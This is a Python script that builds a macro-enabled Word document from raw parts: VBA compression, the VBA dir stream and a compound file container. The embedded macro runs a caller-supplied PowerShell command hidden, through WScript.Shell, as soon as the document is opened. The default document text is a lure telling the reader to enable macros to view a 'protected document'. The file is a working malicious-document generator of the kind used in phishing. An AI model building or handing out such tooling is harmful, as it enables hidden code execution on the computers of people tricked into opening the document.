#!/usr/bin/env python3
"""
Minimal .docm generator — builds vbaProject.bin (CFB + VBA) from scratch.
Usage: gen_docm.py <base64_ps_command> <output.docm> [lure_text]
"""
import struct, zipfile, io, sys, base64

# ── VBA compression (MS-OVBA 2.4.1, uncompressed-chunk mode) ─────────────────

def vba_compress(data: bytes) -> bytes:
    out = bytearray(b'\x01')  # SignatureByte
    padded = data + b'\x00' * ((-len(data)) % 4096)
    if not padded:
        padded = b'\x00' * 4096
    for i in range(0, len(padded), 4096):
        chunk = (padded[i:i+4096]).ljust(4096, b'\x00')
        # Header: isCompressed=0 | sig=0b011<<12 | size-1=0xFFF → 0x3FFF
        out += struct.pack('<H', 0x3FFF) + chunk
    return bytes(out)

# ── VBA dir stream (MS-OVBA 2.3.4) ───────────────────────────────────────────

def _rec(rid, data):
    return struct.pack('<HI', rid, len(data)) + data

def build_dir(module_name='Module1', stream_name='Module1'):
    d = bytearray()
    d += _rec(0x0001, struct.pack('<I', 0x01))          # SYSKIND Win32
    d += _rec(0x0002, struct.pack('<I', 0x0409))        # LCID
    d += _rec(0x0014, struct.pack('<I', 0x0409))        # LCIDUI
    d += _rec(0x0003, struct.pack('<H', 0x04E4))        # CODEPAGE Windows-1252
    d += _rec(0x0004, b'VBAProject')                    # NAME
    d += _rec(0x0005, b'') + _rec(0x0040, b'')          # DOCSTRING + UNICODE
    d += _rec(0x0006, b'') + _rec(0x003D, b'')          # HELPFILEPATH x2
    d += _rec(0x0007, struct.pack('<I', 0))             # HELPCONTEXT
    d += _rec(0x0008, struct.pack('<I', 0))             # LIBFLAGS
    d += struct.pack('<HI', 0x0009, 4) + struct.pack('<I', 0x58400000)  # VERSION major
    d += struct.pack('<HH', 0x0049, 0x000E)             # VERSION minor
    d += _rec(0x000C, b'') + _rec(0x003C, b'')          # CONSTANTS + UNICODE
    d += _rec(0x000F, struct.pack('<H', 1))             # MODULECOUNT = 1
    d += _rec(0x0013, struct.pack('<H', 0xFFFF))        # COOKIE
    mn = module_name.encode('latin-1')
    sn = stream_name.encode('latin-1')
    d += _rec(0x0019, mn)                               # MODULENAME
    d += _rec(0x0047, module_name.encode('utf-16-le'))  # MODULENAMEUNICODE
    d += _rec(0x001A, sn)                               # STREAMNAME
    d += _rec(0x0032, stream_name.encode('utf-16-le'))  # STREAMNAMEUNICODE
    d += _rec(0x001C, b'') + _rec(0x0048, b'')          # DOCSTRING x2
    d += _rec(0x0031, struct.pack('<I', 0))             # MODULEOFFSET (no p-code)
    d += _rec(0x001E, struct.pack('<I', 0))             # HELPCONTEXT
    d += _rec(0x002C, struct.pack('<H', 0xFFFF))        # COOKIE
    d += _rec(0x0021, struct.pack('<I', 0))             # MODULETYPE procedural
    d += _rec(0x002B, b'')                              # MODULETERM
    d += _rec(0x0010, b'')                              # PROJECTMODULETERM
    return bytes(d)

# ── CFB (Compound File Binary) builder ───────────────────────────────────────

ENDOFCHAIN = 0xFFFFFFFE
FREESECT   = 0xFFFFFFFF
FATSECT    = 0xFFFFFFFD
NOSTREAM   = 0xFFFFFFFF
SECTOR     = 512

def _de(name, etype, color, left, right, child, clsid, start, size):
    enc = name.encode('utf-16-le')[:62] if name else b''
    nlen = len(enc) + 2 if enc else 0
    enc = enc.ljust(64, b'\x00')[:64]
    return (enc +
            struct.pack('<H', nlen) +
            struct.pack('<B', etype) +
            struct.pack('<B', color) +
            struct.pack('<I', left) +
            struct.pack('<I', right) +
            struct.pack('<I', child) +
            clsid.ljust(16, b'\x00')[:16] +
            struct.pack('<I', 0) +
            b'\x00' * 16 +
            struct.pack('<I', start) +
            struct.pack('<I', size) +
            b'\x00' * 4)

def build_cfb(streams: dict) -> bytes:
    """streams: {"name": bytes} — flat, all placed at top-level VBA sub-storage."""

    def pad(data, align=SECTOR):
        r = (-len(data)) % align
        return data + b'\x00' * r

    sectors  = []
    fat      = []

    def alloc(data):
        if not data:
            return ENDOFCHAIN, 0
        start = len(sectors)
        chunks = [data[i:i+SECTOR].ljust(SECTOR, b'\x00') for i in range(0,len(data),SECTOR)]
        sectors.extend(chunks)
        for i in range(len(chunks)-1):
            fat.extend([FREESECT]*(start+i+1-len(fat)) or [])
            while len(fat) <= start+i:
                fat.append(FREESECT)
            fat[start+i] = start+i+1
        while len(fat) <= start+len(chunks)-1:
            fat.append(FREESECT)
        fat[start+len(chunks)-1] = ENDOFCHAIN
        return start, len(data)

    # Allocate all streams
    info = {}
    for name, data in streams.items():
        info[name] = alloc(data)

    # PROJECT metadata stream
    proj_txt = (
        b'ID="{A12DCB4F-3154-4B8C-8B3C-8C8E234E5427}"\r\n'
        b'Document=ThisDocument/&H00000000\r\n'
        b'Module=Module1\r\n'
        b'Package={AC9F2F90-E877-11CE-9F68-00AA00574A4F}\r\n'
        b'BaseClass=0\r\n'
    )
    info['PROJECT'] = alloc(proj_txt)

    # Directory entries sector
    ROOT_CLSID = b'\x06\x09\x16\x01' + b'\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46'
    VBA_CLSID  = b'\x01\x0B\x00\x00' + b'\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46'

    # Tree:  Root(0)→child=VBA(1)
    #        VBA(1)→child=_VBA_PROJECT(2), right=PROJECT(5)
    #        _VBA_PROJECT(2)→right=dir(3)
    #        dir(3)→right=Module1(4)
    dir_raw = (
        _de('Root Entry', 5, 1, NOSTREAM, NOSTREAM, 1,   ROOT_CLSID, ENDOFCHAIN, 0) +
        _de('VBA',        1, 1, NOSTREAM, 5,         2,  VBA_CLSID,  ENDOFCHAIN, 0) +
        _de('_VBA_PROJECT',2,1, NOSTREAM, 3, NOSTREAM, b'', *info.get('_VBA_PROJECT',(ENDOFCHAIN,0))) +
        _de('dir',        2, 1, NOSTREAM, 4, NOSTREAM, b'', *info.get('dir',         (ENDOFCHAIN,0))) +
        _de('Module1',    2, 1, NOSTREAM, NOSTREAM, NOSTREAM, b'', *info.get('Module1', (ENDOFCHAIN,0))) +
        _de('PROJECT',    2, 1, NOSTREAM, NOSTREAM, NOSTREAM, b'', *info['PROJECT'])
    )
    dir_start, _ = alloc(dir_raw)

    # FAT sector
    fat_start = len(sectors)
    # Reserve FAT slot
    while len(fat) <= fat_start:
        fat.append(FREESECT)
    fat[fat_start] = FATSECT
    fat_bytes = b''.join(struct.pack('<I', v) for v in fat)
    fat_bytes = fat_bytes.ljust(SECTOR, b'\xff')[:SECTOR]
    sectors.append(fat_bytes)

    # CFB header (512 bytes)
    hdr = (
        b'\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1' +  # magic
        b'\x00' * 16 +                            # CLSID
        struct.pack('<H', 0x003E) +               # minor ver
        struct.pack('<H', 0x0003) +               # major ver (v3 = 512B sectors)
        struct.pack('<H', 0xFFFE) +               # byte order LE
        struct.pack('<H', 9) +                    # sector size log2 = 9 → 512
        struct.pack('<H', 6) +                    # mini sector size log2 = 6 → 64
        b'\x00' * 6 +                             # reserved
        struct.pack('<I', 0) +                    # # dir sectors (must be 0 for v3)
        struct.pack('<I', 1) +                    # # FAT sectors
        struct.pack('<I', dir_start) +            # first dir sector
        struct.pack('<I', 0) +                    # transaction sig
        struct.pack('<I', 4096) +                 # mini stream cutoff
        struct.pack('<I', ENDOFCHAIN) +           # first mini FAT sector
        struct.pack('<I', 0) +                    # # mini FAT sectors
        struct.pack('<I', ENDOFCHAIN) +           # first DIFAT sector
        struct.pack('<I', 0) +                    # # DIFAT sectors
        struct.pack('<I', fat_start) +            # DIFAT[0]
        b'\xFF' * (436 - 4)                       # remaining DIFAT entries (108 × 4 = 432 bytes)
    )
    assert len(hdr) == 512, f"header size {len(hdr)}"
    return hdr + b''.join(sectors)

# ── Main builder ──────────────────────────────────────────────────────────────

def build_vba_bin(ps_cmd: str) -> bytes:
    """Build vbaProject.bin that runs ps_cmd via AutoOpen."""
    # Escape double-quotes inside the command
    ps_escaped = ps_cmd.replace('"', '""')
    vba = (
        'Attribute VB_Name = "Module1"\r\n'
        'Sub AutoOpen()\r\n'
        '    Dim sh As Object\r\n'
        '    Set sh = CreateObject("WScript.Shell")\r\n'
        f'    sh.Run "{ps_escaped}", 0, False\r\n'
        '    Set sh = Nothing\r\n'
        'End Sub\r\n'
        'Sub Document_Open()\r\n'
        '    AutoOpen\r\n'
        'End Sub\r\n'
    )
    streams = {
        '_VBA_PROJECT': b'\xCC\x61\x00\x00',
        'dir':          vba_compress(build_dir()),
        'Module1':      vba_compress(vba.encode('latin-1')),
    }
    return build_cfb(streams)


def build_docm(ps_cmd: str, out_path: str,
               lure: str = 'Enable macros to view this protected document.'):
    vba_bin = build_vba_bin(ps_cmd)

    ct = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">\n'
        '  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>\n'
        '  <Default Extension="xml"  ContentType="application/xml"/>\n'
        '  <Override PartName="/word/document.xml"'
        ' ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>\n'
        '  <Override PartName="/word/vbaProject.bin"'
        ' ContentType="application/vnd.ms-office.activeX+xml"/>\n'
        '</Types>'
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
        '  <Relationship Id="rId1"'
        ' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
        ' Target="word/document.xml"/>\n'
        '</Relationships>'
    )
    doc_rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">\n'
        '  <Relationship Id="rId1"'
        ' Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject"'
        ' Target="vbaProject.bin"/>\n'
        '</Relationships>'
    )
    doc_xml = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
        '<w:body>\n'
        f'<w:p><w:r><w:t>{lure}</w:t></w:r></w:p>\n'
        '<w:sectPr/>\n'
        '</w:body>\n'
        '</w:document>'
    )
    settings = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
        '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">\n'
        '  <w:compat/>\n'
        '</w:settings>'
    )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml',          ct)
        zf.writestr('_rels/.rels',                  rels)
        zf.writestr('word/document.xml',            doc_xml)
        zf.writestr('word/_rels/document.xml.rels', doc_rels)
        zf.writestr('word/settings.xml',            settings)
        zf.writestr('word/vbaProject.bin',          vba_bin)

    data = buf.getvalue()
    with open(out_path, 'wb') as f:
        f.write(data)
    print(f'{out_path} ({len(data)} bytes)', flush=True)


if __name__ == '__main__':
    if len(sys.argv) < 3:
        print('usage: gen_docm.py <ps_command> <out.docm> [lure_text]', file=sys.stderr)
        sys.exit(1)
    lure = sys.argv[3] if len(sys.argv) > 3 else 'Enable macros to view this protected document.'
    build_docm(sys.argv[1], sys.argv[2], lure)
